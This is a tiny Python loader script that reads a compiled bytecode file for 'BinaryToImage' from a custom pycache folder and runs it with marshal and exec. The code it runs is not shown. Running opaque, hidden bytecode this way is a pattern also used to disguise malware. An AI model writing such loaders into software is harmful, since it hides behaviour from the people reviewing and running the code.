
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'BinaryToImage_e2129c407bc4415ba533e34cd767b894.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
